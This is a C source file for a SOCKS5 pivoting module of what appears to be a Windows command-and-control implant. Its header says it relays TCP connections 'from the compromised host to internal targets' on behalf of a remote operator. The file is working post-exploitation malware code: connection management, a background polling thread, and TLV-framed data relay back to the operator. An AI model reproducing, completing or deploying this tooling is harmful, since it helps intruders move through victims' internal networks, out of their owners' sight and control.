/*
 * socks_proxy.c — In-agent SOCKS5 proxy for network pivoting.
 *
 * All TCP connections from the compromised host to internal targets
 * are managed here. The operator side handles the actual SOCKS5
 * protocol negotiation with client tools; the agent just opens
 * TCP connections and relays data.
 */
#include "agent.h"
#include "socks_proxy.h"

#pragma comment(lib, "ws2_32.lib")

static BOOL g_wsaInitialized = FALSE;

/* ─── Helpers ─── */

static SOCKS_CONNECTION *_find_conn(SOCKS_PROXY *proxy, DWORD connId) {
    for (int i = 0; i < proxy->connCount; i++) {
        if (proxy->conns[i].connId == connId &&
            proxy->conns[i].state != SOCKS_STATE_CLOSED)
        {
            return &proxy->conns[i];
        }
    }
    return NULL;
}

static SOCKS_CONNECTION *_alloc_conn(SOCKS_PROXY *proxy) {
    /* First try to reuse a closed slot */
    for (int i = 0; i < proxy->connCount; i++) {
        if (proxy->conns[i].state == SOCKS_STATE_CLOSED) {
            return &proxy->conns[i];
        }
    }
    /* Allocate new slot */
    if (proxy->connCount >= SOCKS_MAX_CONNECTIONS)
        return NULL;
    return &proxy->conns[proxy->connCount++];
}

static void _close_conn(SOCKS_CONNECTION *conn) {
    if (!conn) return;
    if (conn->sock != INVALID_SOCKET) {
        shutdown(conn->sock, SD_BOTH);
        closesocket(conn->sock);
        conn->sock = INVALID_SOCKET;
    }
    if (conn->recvBuf) {
        SecureZeroMemory(conn->recvBuf, conn->recvCap);
        HeapFree(GetProcessHeap(), 0, conn->recvBuf);
        conn->recvBuf = NULL;
    }
    conn->recvLen = 0;
    conn->recvCap = 0;
    conn->state = SOCKS_STATE_CLOSED;
}

/* ─── Background poll thread ─── */

static DWORD WINAPI _poll_thread(LPVOID param) {
    SOCKS_PROXY *proxy = (SOCKS_PROXY *)param;

    while (proxy->running) {
        EnterCriticalSection(&proxy->lock);

        DWORD now = (DWORD)GetTickCount64();

        for (int i = 0; i < proxy->connCount; i++) {
            SOCKS_CONNECTION *conn = &proxy->conns[i];
            if (conn->state != SOCKS_STATE_CONNECTED)
                continue;

            /* Check idle timeout */
            if (now - conn->lastActivity > SOCKS_IDLE_TIMEOUT) {
                _close_conn(conn);
                continue;
            }

            /* Check for readable data (non-blocking) */
            fd_set readSet;
            FD_ZERO(&readSet);
            FD_SET(conn->sock, &readSet);
            struct timeval tv = { 0, 0 };  /* Non-blocking check */

            int sel = select(0, &readSet, NULL, NULL, &tv);
            if (sel > 0 && FD_ISSET(conn->sock, &readSet)) {
                /* Ensure recv buffer exists */
                if (!conn->recvBuf) {
                    conn->recvBuf = (unsigned char *)HeapAlloc(
                        GetProcessHeap(), 0, SOCKS_RECV_BUF_SIZE);
                    if (!conn->recvBuf) {
                        _close_conn(conn);
                        continue;
                    }
                    conn->recvCap = SOCKS_RECV_BUF_SIZE;
                    conn->recvLen = 0;
                }

                /* Read available data */
                DWORD space = conn->recvCap - conn->recvLen;
                if (space == 0) {
                    /* Buffer full — data will be drained by socks_poll */
                    continue;
                }

                int bytesRead = recv(conn->sock,
                                     (char *)conn->recvBuf + conn->recvLen,
                                     (int)space, 0);

                if (bytesRead > 0) {
                    conn->recvLen += bytesRead;
                    conn->lastActivity = now;
                } else if (bytesRead == 0) {
                    /* Connection closed by remote */
                    conn->state = SOCKS_STATE_ERROR;
                } else {
                    int err = WSAGetLastError();
                    if (err != WSAEWOULDBLOCK) {
                        conn->state = SOCKS_STATE_ERROR;
                    }
                }
            } else if (sel == SOCKET_ERROR) {
                conn->state = SOCKS_STATE_ERROR;
            }
        }

        LeaveCriticalSection(&proxy->lock);
        Sleep(10);  /* 10ms poll interval — balance latency vs CPU */
    }

    return 0;
}

/* ═══════════════════════════════════════════════════════════════════
 *  Public API
 * ═══════════════════════════════════════════════════════════════════ */

BOOL socks_init(SOCKS_PROXY *proxy) {
    if (!proxy) return FALSE;

    memset(proxy, 0, sizeof(SOCKS_PROXY));
    InitializeCriticalSection(&proxy->lock);

    /* Initialize Winsock if needed */
    if (!g_wsaInitialized) {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
            return FALSE;
        g_wsaInitialized = TRUE;
    }

    /* Initialize all sockets to INVALID */
    for (int i = 0; i < SOCKS_MAX_CONNECTIONS; i++) {
        proxy->conns[i].sock = INVALID_SOCKET;
        proxy->conns[i].state = SOCKS_STATE_CLOSED;
    }

    proxy->running = TRUE;

    /* Start background poll thread */
    proxy->hPollThread = CreateThread(NULL, 0, _poll_thread, proxy, 0, NULL);
    if (!proxy->hPollThread) {
        proxy->running = FALSE;
        return FALSE;
    }

    return TRUE;
}

void socks_shutdown(SOCKS_PROXY *proxy) {
    if (!proxy) return;

    proxy->running = FALSE;

    /* Wait for poll thread to exit */
    if (proxy->hPollThread) {
        WaitForSingleObject(proxy->hPollThread, 5000);
        CloseHandle(proxy->hPollThread);
        proxy->hPollThread = NULL;
    }

    /* Close all connections */
    EnterCriticalSection(&proxy->lock);
    for (int i = 0; i < proxy->connCount; i++) {
        _close_conn(&proxy->conns[i]);
    }
    proxy->connCount = 0;
    LeaveCriticalSection(&proxy->lock);

    DeleteCriticalSection(&proxy->lock);
}

BOOL socks_connect(SOCKS_PROXY *proxy, DWORD connId,
                   const char *targetHost, USHORT targetPort)
{
    if (!proxy || !targetHost || targetPort == 0)
        return FALSE;

    EnterCriticalSection(&proxy->lock);

    /* Check for duplicate connId */
    if (_find_conn(proxy, connId)) {
        LeaveCriticalSection(&proxy->lock);
        return FALSE;  /* Already exists */
    }

    SOCKS_CONNECTION *conn = _alloc_conn(proxy);
    if (!conn) {
        LeaveCriticalSection(&proxy->lock);
        return FALSE;  /* No slots available */
    }

    memset(conn, 0, sizeof(SOCKS_CONNECTION));
    conn->connId = connId;
    conn->sock = INVALID_SOCKET;
    conn->state = SOCKS_STATE_CONNECTING;
    conn->targetPort = targetPort;
    strncpy(conn->targetHost, targetHost, sizeof(conn->targetHost) - 1);
    conn->lastActivity = (DWORD)GetTickCount64();

    LeaveCriticalSection(&proxy->lock);

    /* Resolve hostname */
    struct addrinfo hints, *result = NULL;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    char portStr[8];
    _snprintf(portStr, sizeof(portStr), "%u", targetPort);

    int gaiResult = getaddrinfo(targetHost, portStr, &hints, &result);
    if (gaiResult != 0 || !result) {
        EnterCriticalSection(&proxy->lock);
        conn->state = SOCKS_STATE_ERROR;
        LeaveCriticalSection(&proxy->lock);
        return FALSE;
    }

    /* Create socket */
    SOCKET sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (sock == INVALID_SOCKET) {
        freeaddrinfo(result);
        EnterCriticalSection(&proxy->lock);
        conn->state = SOCKS_STATE_ERROR;
        LeaveCriticalSection(&proxy->lock);
        return FALSE;
    }

    /* Set non-blocking for connect with timeout */
    u_long nonBlocking = 1;
    ioctlsocket(sock, FIONBIO, &nonBlocking);

    /* Initiate connection */
    int connectResult = connect(sock, result->ai_addr, (int)result->ai_addrlen);
    freeaddrinfo(result);

    if (connectResult == SOCKET_ERROR) {
        int err = WSAGetLastError();
        if (err == WSAEWOULDBLOCK) {
            /* Connection in progress — wait with timeout */
            fd_set writeSet, exceptSet;
            FD_ZERO(&writeSet);
            FD_ZERO(&exceptSet);
            FD_SET(sock, &writeSet);
            FD_SET(sock, &exceptSet);
            struct timeval tv = { 10, 0 };  /* 10 second connect timeout */

            int sel = select(0, NULL, &writeSet, &exceptSet, &tv);
            if (sel <= 0 || FD_ISSET(sock, &exceptSet)) {
                closesocket(sock);
                EnterCriticalSection(&proxy->lock);
                conn->state = SOCKS_STATE_ERROR;
                LeaveCriticalSection(&proxy->lock);
                return FALSE;
            }
        } else {
            closesocket(sock);
            EnterCriticalSection(&proxy->lock);
            conn->state = SOCKS_STATE_ERROR;
            LeaveCriticalSection(&proxy->lock);
            return FALSE;
        }
    }

    /* Keep socket non-blocking for recv polling */
    /* (already set above) */

    EnterCriticalSection(&proxy->lock);
    conn->sock = sock;
    conn->state = SOCKS_STATE_CONNECTED;
    conn->lastActivity = (DWORD)GetTickCount64();
    LeaveCriticalSection(&proxy->lock);

    return TRUE;
}

BOOL socks_send_data(SOCKS_PROXY *proxy, DWORD connId,
                     const unsigned char *data, DWORD dataLen)
{
    if (!proxy || !data || dataLen == 0)
        return FALSE;

    EnterCriticalSection(&proxy->lock);
    SOCKS_CONNECTION *conn = _find_conn(proxy, connId);
    if (!conn || conn->state != SOCKS_STATE_CONNECTED) {
        LeaveCriticalSection(&proxy->lock);
        return FALSE;
    }

    SOCKET sock = conn->sock;
    conn->lastActivity = (DWORD)GetTickCount64();
    LeaveCriticalSection(&proxy->lock);

    /* Send data to target — may need multiple sends */
    DWORD totalSent = 0;
    while (totalSent < dataLen) {
        /* Temporarily set blocking for send */
        u_long blocking = 0;
        ioctlsocket(sock, FIONBIO, &blocking);

        int sent = send(sock, (const char *)data + totalSent,
                        (int)(dataLen - totalSent), 0);

        /* Restore non-blocking */
        u_long nonBlocking = 1;
        ioctlsocket(sock, FIONBIO, &nonBlocking);

        if (sent == SOCKET_ERROR) {
            EnterCriticalSection(&proxy->lock);
            conn->state = SOCKS_STATE_ERROR;
            LeaveCriticalSection(&proxy->lock);
            return FALSE;
        }
        totalSent += sent;
    }

    return TRUE;
}

void socks_close_connection(SOCKS_PROXY *proxy, DWORD connId) {
    if (!proxy) return;

    EnterCriticalSection(&proxy->lock);
    SOCKS_CONNECTION *conn = _find_conn(proxy, connId);
    if (conn) {
        _close_conn(conn);
    }
    LeaveCriticalSection(&proxy->lock);
}

int socks_poll(SOCKS_PROXY *proxy, unsigned char *outBuf,
               DWORD outBufSize, DWORD *bytesWritten)
{
    if (!proxy || !outBuf || !bytesWritten)
        return 0;

    *bytesWritten = 0;
    int connsWithData = 0;

    EnterCriticalSection(&proxy->lock);

    for (int i = 0; i < proxy->connCount; i++) {
        SOCKS_CONNECTION *conn = &proxy->conns[i];

        /* Report data from connected sockets */
        if (conn->recvLen > 0 &&
            (conn->state == SOCKS_STATE_CONNECTED || conn->state == SOCKS_STATE_ERROR))
        {
            /*
             * Pack into TLV format:
             *   TYPE(2B) = 0xF000 (SOCKS_CONN_ID)
             *   LEN(4B)  = 4
             *   VALUE    = connId (4B LE)
             *
             *   TYPE(2B) = 0xF002 (SOCKS_DATA_CHUNK)
             *   LEN(4B)  = dataLen
             *   VALUE    = data bytes
             */
            DWORD entrySize = (2 + 4 + 4) + (2 + 4 + conn->recvLen);
            if (*bytesWritten + entrySize > outBufSize)
                break;  /* Buffer full — remaining data stays for next poll */

            unsigned char *p = outBuf + *bytesWritten;

            /* SOCKS_CONN_ID TLV */
            *(USHORT *)p = 0xF000;  p += 2;
            *(DWORD *)p = 4;        p += 4;
            *(DWORD *)p = conn->connId; p += 4;

            /* SOCKS_DATA_CHUNK TLV */
            *(USHORT *)p = 0xF002;  p += 2;
            *(DWORD *)p = conn->recvLen; p += 4;
            memcpy(p, conn->recvBuf, conn->recvLen);
            p += conn->recvLen;

            *bytesWritten += entrySize;
            conn->recvLen = 0;  /* Data consumed */
            connsWithData++;
        }

        /* Report closed/errored connections */
        if (conn->state == SOCKS_STATE_ERROR && conn->recvLen == 0) {
            /* Send close notification */
            DWORD closeSize = 2 + 4 + 4;  /* SOCKS_CLOSE TLV */
            if (*bytesWritten + closeSize <= outBufSize) {
                unsigned char *p = outBuf + *bytesWritten;
                *(USHORT *)p = 0xF003;  p += 2;  /* SOCKS_CLOSE */
                *(DWORD *)p = 4;        p += 4;
                *(DWORD *)p = conn->connId; p += 4;
                *bytesWritten += closeSize;
            }
            _close_conn(conn);
        }
    }

    LeaveCriticalSection(&proxy->lock);
    return connsWithData;
}

void socks_get_stats(SOCKS_PROXY *proxy, SOCKS_STATS *stats) {
    if (!proxy || !stats) return;
    memset(stats, 0, sizeof(SOCKS_STATS));

    EnterCriticalSection(&proxy->lock);
    for (int i = 0; i < proxy->connCount; i++) {
        stats->totalConnections++;
        if (proxy->conns[i].state == SOCKS_STATE_CONNECTED ||
            proxy->conns[i].state == SOCKS_STATE_CONNECTING)
        {
            stats->activeConnections++;
        }
    }
    LeaveCriticalSection(&proxy->lock);
}
